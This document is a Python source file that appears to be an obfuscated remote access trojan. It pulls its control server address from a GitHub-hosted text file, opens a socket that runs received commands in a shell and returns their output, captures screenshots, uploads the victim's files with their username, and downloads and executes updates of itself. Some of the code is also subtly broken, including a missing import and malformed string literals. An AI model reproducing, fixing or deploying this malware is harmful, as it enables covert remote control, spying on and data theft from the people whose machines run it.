import sys,subprocess,socket,time,requests
from PIL import ImageGrab
XaUxQEvL = "1.29.11.24"
sFPodRYPSUfBSxIrz = ""
yFEgKYqStiEtzCz = ""
DIareSsDIT = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
ifHEKfSOiJASBooSUHdhHO = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
atdyjfbuVAPzHK = "!"
def BnYUapmKbAKphobHSOdwn(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	return s
def UXMydufdBFCxmaB(s):
	VcurGgQvTQmCnpPLSHOdzpT = s.recv(1024)
	if len(VcurGgQvTQmCnpPLSHOdzpT)==0:
		return True
	fLwALURDsm = VcurGgQvTQmCnpPLSHOdzpT.decode("utf-8")
	if not fLwALURDsm.startswith(atdyjfbuVAPzHK):
		proc = subprocess.run(VcurGgQvTQmCnpPLSHOdzpT.decode("utf-8"), shell=True, capture_output=True)
		result = proc.stdout + proc.stderr
		s.send(result)
		return
	cGswNiBkXS = fLwALURDsm.split(" ")[0][1:]
	if cGswNiBkXS == "download":
		YuwnjYQBtGhv(s, fLwALURDsm)
	elif cGswNiBkXS == "screenshot":
		ioNdArMuOlzDsn(s)
	elif cGswNiBkXS == "RKGbEqsegigASXuobBfuHC":
		s.send(bytes(XaUxQEvL, "utf-8"))
def YuwnjYQBtGhv(s, fLwALURDsm):
	YWqIrmzfD = fLwALURDsm.replace(atdyjfbuVAPzHK+"screenshot ", "").split(",")
	results = []
	for f in YWqIrmzfD:
		results += eRYctiFaLPT(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(" ".join(results))
def ioNdArMuOlzDsn(fLwALURDsm):
	ApZEIfkztXcYBMlBOu = ImageGrab.grab(
		bbox=None,
		include_layered_windows=False,
		all_screens=True,
		xdisplay=None
	)
	fpath = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	ApZEIfkztXcYBMlBOu.save(fpath)
	ApZEIfkztXcYBMlBOu.close()
	r = eRYctiFaLPT(fpath, "api/sscap")
	os.remove(fpath)
	s.send(r)
def eRYctiFaLPT(HbELIeiOW, VVCpdPZmw, xmITUmEbsZ=None):
	if not os.path.exists(HbELIeiOW):
		return "FILE NOT FOUND: "+HbELIeiOW
	headers = {"user":os.getlogin()}
	if xmITUmEbsZ is not None:
		headers = {**headers, **xmITUmEbsZ}
	requests.post(sFPodRYPSUfBSxIrz+":"+yFEgKYqStiEtzCz+"/"+VVCpdPZmw,
		files={open(HbELIeiOW, "rb")},
		headers=headers)
	return "SUCCESS"
def KLTEKFUxfQeHYeuxD():
	if sFPodRYPSUfBSxIrz == "" or yFEgKYqStiEtzCz == "":
		VcurGgQvTQmCnpPLSHOdzpT = requests.get(DIareSsDIT).text.replace("\n","").split(":")
		sFPodRYPSUfBSxIrz = VcurGgQvTQmCnpPLSHOdzpT[0].strip()
		yFEgKYqStiEtzCz = VcurGgQvTQmCnpPLSHOdzpT[1].strip()
		RKGbEqsegigASXuobBfuHC = VcurGgQvTQmCnpPLSHOdzpT[2].strip()
	return sFPodRYPSUfBSxIrz, yFEgKYqStiEtzCz, RKGbEqsegigASXuobBfuHC
def cgohSSnXQfUmFjr():
	HiomcUnDiDkQqecu = os.path.basename(__file__)
	fileType = HiomcUnDiDkQqecu.split(".")[-1]
	oKFQYEVUil = HiomcUnDiDkQqecu.replace(fileType,"") +"."+XaUxQEvL + fileType
	lFfgiyjDL = os.path.join(os.path.getcwd(), oKFQYEVUil)
	with open(oKFQYEVUil, "wb+") as f:
		f.write(requests.get(ifHEKfSOiJASBooSUHdhHO+"/file"+lFfgiyjDL.split(".")[-1]))
	if fileType == ".exe":
		os.system(".\"+lFfgiyjDL)
	elif fileType == ".pyw":
		os.system("python "+lFfgiyjDL")
def nsLTHiwed():
	pass
def kHnJsWYOfVdGZXdGpPDPhlh():
	h, p, v = KLTEKFUxfQeHYeuxD()
	if XaUxQEvL != v:
		cgohSSnXQfUmFjr()
	nsLTHiwed()
	while True:
		try:
			while True:
				dDbJcOtBPrNYfWy=False
				try:
					s=BnYUapmKbAKphobHSOdwn(h, p)
					while not dDbJcOtBPrNYfWy:
						s.send(b"\n>> ")
						dDbJcOtBPrNYfWy=UXMydufdBFCxmaB(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
sys.exit(kHnJsWYOfVdGZXdGpPDPhlh())
